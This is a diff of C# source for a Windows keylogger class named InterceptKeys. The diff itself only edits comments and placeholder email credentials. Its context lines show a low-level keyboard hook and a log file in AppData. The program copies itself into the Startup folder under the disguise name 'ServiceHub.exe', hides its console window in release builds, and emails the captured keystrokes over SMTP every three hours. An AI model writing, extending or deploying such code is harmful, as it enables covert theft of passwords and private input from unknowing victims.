@@ -12,13 +12,13 @@ class InterceptKeys
     private static readonly int SENDINTERVAL = 10800000; // 3 hours
     private static readonly string LOGFILENAME = $@"C:\Users\{Environment.UserName}\AppData\Local\log.txt";
     private static readonly string STARTUPFILENAME = $@"C:\Users\{Environment.UserName}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ServiceHub.exe";
-    //private static readonly string CURRENTFILENAME = $@"{Directory.GetCurrentDirectory()}\Application Frame Host.exe";
+
     private static readonly string CURRENTFILENAME = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
 
 
     private static string emailFrom = "EmailFrom@gmail.com";
     private static string emailTo = "EmailTo@gmail.com";
-    private static string password = "Password";
+    private static string password = "YourPassword";
 
 
     private const int WH_KEYBOARD_LL = 13;
@@ -28,7 +28,6 @@ class InterceptKeys
 
     static readonly object _locker = new object();
 
-
     public static void Main(string[] args)
     {
         AddToStartUp();
@@ -37,7 +36,7 @@ class InterceptKeys
 
 #if DEBUG
 #else
-        // Hide
+        // Hide console window on production
         ShowWindow(handle, SW_HIDE);
 #endif
 
@@ -57,7 +56,7 @@ class InterceptKeys
             if (CURRENTFILENAME != STARTUPFILENAME)
             {
                 Console.WriteLine("Adding to StartUp Folder");
-                File.Copy(CURRENTFILENAME, STARTUPFILENAME, true); // Copy or rewrite
+                File.Copy(CURRENTFILENAME, STARTUPFILENAME, true);
             }
             else
             {
@@ -104,7 +103,6 @@ class InterceptKeys
                 smtpClient.Send(emailFrom, emailTo, "subject", fileContent);
                 Console.WriteLine("Email sent");
 
-                // rewrite file
                 lock (_locker)
                 {
                     using (var sw = new StreamWriter(LOGFILENAME))
